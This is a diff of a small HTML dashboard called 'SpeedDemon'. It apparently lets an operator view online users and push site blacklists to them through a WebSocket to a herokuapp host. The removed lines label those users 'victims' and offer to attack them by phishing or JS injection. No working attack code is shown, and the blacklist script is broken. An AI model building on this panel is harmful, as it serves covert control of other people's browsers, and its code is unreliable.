@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>SpeedDemon</title>
     <link rel="stylesheet" href="bootstrap-4.0.0-dist/css/bootstrap.min.css"> 
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script src="bootstrap-4.0.0-dist/js/bootstrap.min.js"></script>
 	<link href="style.css" rel="stylesheet">
   </head>
@@ -26,35 +25,62 @@
 
 
 	<!-- List of Online Victims -->
-	<ul class="victims">
-		<li class="victim">
-			<a class="victim-link" href="#">User 1</a>
-		</li>
-		<li class="victim">
-			<a class="victim-link" href="#">User 2</a>
-		</li>
-		<li class="victim">
-			<a class="victim-link" href="#">User 3</a>
-		</li>
-	</ul>
+	<h5>User IDs (Click an ID for more info on the user.)</h5>
+	<table style="width:100%" id="ID-list">
+        <tr>
+            <th align="left">ID</th>
+            <th align="left">Status</th>
+        </tr>
+
+        <tr>
+            <td><a class="user-link" href="infoPage.html">21431904</a></td>
+            <td>Online</td>
+        </tr>
+        <tr>
+            <td><a class="user-link" href="infoPage.html">37928402</a></td>
+            <td>Online</td>
+        </tr>
+        <tr>
+            <td><a class="user-link" href="infoPage.html">57298352</a></td>
+            <td>Online</td>
+        </tr>
+        <!--Use script to populate this list-->        
+    </table>
+
+
+
+	<!-- Spacing things Out -->
+	<br>
+	<hr class="my-4">
+	<br>
 
 
 	<!-- Adding Blacklisted Site -->
 	<h4>Add Site to Blacklist Here</h4>
 	<input type="text" class="form-control blacklist" placeholder="URL">
-	<button class="btn btn-default" type="button">Add Site</button>
+	<button class="btn btn-default" type="button" onclick="blackList()">Add Site</button>
+
+	<script>
+	    function blackList(){
+	        var URL = document.getElementById(text);
+	        var HOST = 'wss://projectnickname123.herokuapp.com';
+	        var ws = new WebSocket(HOST);
+	        var jsonPackage = {id: 0, type:'list', addString: URL};
+	        ws.send(JSON.stringify(jsonPackage));
+	    }
+	</script>
 
 
 
-	<!-- Spacing things Out -->
-	<hr class="my-4">
 
 
 
-	<!-- Attack User With Phish or JS -->
- 	<h5>Enter User ID to Attack by Phishing or JS Injection</h5>
 
+  
 
     
+    
   </body>
+
+
 </html>
